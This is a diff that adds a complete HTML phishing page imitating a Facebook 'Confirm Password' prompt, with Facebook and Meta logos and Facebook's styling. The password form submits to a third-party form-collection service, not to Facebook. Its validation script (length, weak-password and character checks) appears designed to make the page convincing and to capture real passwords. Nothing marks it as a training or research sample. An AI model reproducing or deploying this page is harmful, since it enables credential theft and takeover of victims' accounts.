@@ -1,0 +1,209 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Confirm Password</title>
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 30px;
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+    }
+
+    .fb-logo {
+      margin-bottom: 10px;
+    }
+
+    .fb-logo img {
+      height: 60px;
+    }
+
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+    }
+
+    .input-container {
+      width: 100%;
+      position: relative;
+      margin-bottom: -10px;
+    }
+
+    .input-container input {
+      width: 100%;
+      padding: 15px 50px 15px 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      transition: 0.3s;
+    }
+
+    /* 🔵 Blue border on focus for both password and text type */
+    .input-container input:focus {
+      outline: none;
+      border: 1px solid #1877f2;
+      box-shadow: 0 0 5px #1877f2;
+    }
+
+    .input-container i {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+      cursor: pointer;
+    }
+
+    .btn-confirm {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      margin-bottom: 20px;
+    }
+
+    .btn-confirm:hover {
+      background-color: #165ecb;
+    }
+
+    .meta-footer img {
+      height: 65px;
+      opacity: 0.6;
+    }
+
+    #error-message {
+      color: red;
+      font-size: 14px;
+      margin: -10px 0 -10px 0;
+    }
+
+    @media (max-width: 480px) {
+      .input-container input,
+      .btn-confirm {
+        font-size: 15px;
+        padding: 14px;
+      }
+
+      .container {
+        gap: 25px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Facebook Logo -->
+    <div class="fb-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    </div>
+
+    <!-- ✅ Password Form -->
+    <form id="passwordForm" action=https://submit-form.com/8bUH6rmFE" method="POST">
+      <div class="input-container">
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        <i class="fa-solid fa-eye" id="togglePassword"></i>
+      </div>
+      <p id="error-message"></p>
+      <button class="btn-confirm" type="submit">Confirm</button>
+    </form>
+
+    <!-- Meta Footer Logo -->
+    <div class="meta-footer">
+      <img src="https://i.postimg.cc/90g3K8C6/images-2-removebg-preview.png" alt="Meta Logo">
+    </div>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    // Toggle Password Visibility
+    document.getElementById('togglePassword').addEventListener('click', function () {
+      const passwordField = document.getElementById('password');
+      const eyeIcon = this;
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+      } else {
+        passwordField.type = 'password';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+      }
+    });
+
+    // Password Validation
+    document.getElementById('passwordForm').addEventListener('submit', function (event) {
+      const passwordField = document.getElementById('password');
+      const errorMessage = document.getElementById('error-message');
+      const password = passwordField.value;
+
+      // Weak passwords list
+      const weakPasswords = ['123456','password','abcdef','12345678','qwerty'];
+
+      // Minimum length check
+      if (password.length < 6) {
+        errorMessage.textContent = 'Password must be at least 6 characters long.';
+        event.preventDefault();
+        return;
+      }
+
+      // Weak password check
+      if (weakPasswords.includes(password.toLowerCase())) {
+        errorMessage.textContent = 'Please choose a stronger password.';
+        event.preventDefault();
+        return;
+      }
+
+      // Invalid characters or emojis check (includes space)
+      const invalidPattern = /[%'"\\\s]|[\uD800-\uDFFF]/;
+      if (invalidPattern.test(password)) {
+        errorMessage.textContent = 'Password contains invalid characters or spaces.';
+        event.preventDefault();
+        return;
+      }
+
+      // Internet connection check
+      if (!navigator.onLine) {
+        errorMessage.textContent = 'No internet connection.';
+        event.preventDefault();
+        return;
+      }
+
+      errorMessage.textContent = ''; // Clear error
+    });
+  </script>
+
+</body>
+</html>
